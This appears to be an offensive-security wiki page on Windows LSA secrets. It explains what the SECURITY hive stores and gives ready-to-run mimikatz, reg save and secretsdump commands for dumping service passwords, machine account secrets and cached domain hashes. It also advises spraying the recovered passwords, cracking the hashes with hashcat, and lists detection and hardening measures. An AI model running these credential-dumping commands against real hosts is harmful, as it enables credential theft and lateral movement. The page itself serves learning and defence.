---
title: LSA secrets
slug: lsa-secrets
---

> **TL;DR:** A SYSTEM-readable area of the SECURITY hive that stores service account plaintext passwords, machine account secrets, autologon creds, and the DPAPI machine bootstrap key.

## What it is
The Local Security Authority caches a set of long-lived secrets under `HKLM\SECURITY\Policy\Secrets\<name>`. Two parts matter: the `CurrVal` (current encrypted blob) and `OldVal` (previous, kept after rotation). They are encrypted with a key derived from the SYSKEY (bootkey) stored across four obfuscated `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\{JD,Skew1,GBG,Data}` registry classes. Decrypting them yields plaintext for whatever was stashed.

Typical contents:
- `$MACHINE.ACC` — the machine account password (use it to mint silver tickets or relay as the host)
- `_SC_<service>` — plaintext password of any service running under a named account
- `DefaultPassword` — autologon credential when configured
- `DPAPI_SYSTEM` — bootstraps machine-DPAPI ([[dpapi-secrets]])
- `NL$KM` — key used to decrypt domain cached logons (DCC2 / "mscash2")

## Preconditions / where it applies
- SYSTEM on the target (live extraction) — `lsadump::secrets` requires it
- OR offline access to `SECURITY` + `SYSTEM` hives via `reg save`, VSS, or disk image
- Workstation and server alike — DCs also store the krbtgt-related secrets here in addition to NTDS

## Technique
Live, on the box:

```
mimikatz # token::elevate
mimikatz # lsadump::secrets
```

Offline (preferred — quieter, parsed off-host):

```cmd
reg save HKLM\SYSTEM   sys.sav
reg save HKLM\SECURITY sec.sav
```

Then:

```
secretsdump.py -system sys.sav -security sec.sav LOCAL
```

Output sections to harvest:
- `[*] Dumping LSA Secrets` — plaintext service account passwords; spray these against other hosts.
- `[*] Dumping cached domain logon information` — DCC2 hashes for the last 10 interactive domain users, crack offline (slow KDF — `hashcat -m 2100`).
- `$MACHINE.ACC` (NT) — usable for [[credential-dumping]] follow-ups and Kerberos delegation primitives.

Cached domain logons live under `HKLM\SECURITY\Cache\NL$<n>` and are gated by `CachedLogonsCount` (default 10).

## Detection and defence
- `reg save` of HKLM\SECURITY or HKLM\SYSTEM by non-admin tooling — easy SACL/Sysmon-13 hit
- LSA querying via `LsaRetrievePrivateData` from unexpected processes
- Set `CachedLogonsCount=0` on sensitive hosts to wipe DCC2 material
- Run service accounts as gMSA (passwords managed by AD, never disclosed) instead of static SVC accounts
- Add high-value accounts to Protected Users group; enforce LAPS for local admin

## References
- [HackTricks — credentials protections](https://book.hacktricks.wiki/en/windows-hardening/stealing-credentials/credentials-protections.html) — LSA/LSASS hardening summary
- [Impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py) — offline LSA secret parser
- [MITRE ATT&CK T1003.004](https://attack.mitre.org/techniques/T1003/004/) — LSA secrets technique entry
